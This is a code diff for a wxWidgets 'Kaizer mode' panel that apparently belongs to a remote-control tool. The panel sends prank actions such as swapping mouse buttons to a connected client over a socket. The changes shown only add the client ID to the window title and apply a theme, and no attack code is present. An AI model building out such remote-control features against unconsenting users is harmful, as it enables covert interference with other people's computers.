@@ -1,5 +1,6 @@
 #include "panel_fun.hpp"
 #include "server.hpp"
+#include "misc.hpp"
 
 extern Servidor* p_Servidor;
 
@@ -8,9 +9,10 @@ wxBEGIN_EVENT_TABLE(panelFun, wxFrame)
 	EVT_TOGGLEBUTTON(wxID_ANY, panelFun::OnToggle)
 wxEND_EVENT_TABLE()
 
-panelFun::panelFun(wxWindow* pParent, SOCKET _socket)
+panelFun::panelFun(wxWindow* pParent, SOCKET _socket, std::string _strID)
 	:wxFrame(pParent, EnumFunIDS::ID_Main_Window, "Kaizer mode") {
 	this->sckSocket = _socket;
+	this->SetTitle("[" + _strID.substr(0, _strID.find('/', 0)) + "] Kaizer mode");
 
 	//Mouse y teclado
 	this->btn_Swap = new wxToggleButton(this, EnumFunIDS::ID_BTN_Swap, "SWAP Mouse");
@@ -57,6 +59,8 @@ panelFun::panelFun(wxWindow* pParent, SOCKET _socket)
 	main_sizer->Add(this->btn_CD);
 
 	this->SetSizer(main_sizer);
+
+	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
 }
 
 void panelFun::OnMsg(wxCommandEvent& event) {
